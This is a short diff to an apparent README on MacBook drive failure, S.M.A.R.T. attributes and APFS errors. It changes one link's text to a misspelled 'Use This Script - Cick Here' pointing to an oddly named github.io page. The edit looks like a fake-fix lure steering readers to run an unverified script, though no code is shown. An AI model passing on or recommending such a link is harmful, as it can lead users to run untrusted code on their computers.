@@ -6,7 +6,7 @@
 
 ## MacBook Hard Drive Failure — S.M.A.R.T. Attribute Architecture, NVMe Error Codes, and APFS Failure Signatures
 
-> **[Read your Mac's S.M.A.R.T. data and APFS error log](https://error-number-472173.github.io/.github/mac-hard-drive-failure)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.
+> **[Use This Script - Cick Here](https://error-number-472173.github.io/.github/mac-hard-drive-failure)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.
 
 **What's actually responsible for Mac Hard Drive Failure, in order of architectural impact:**
 
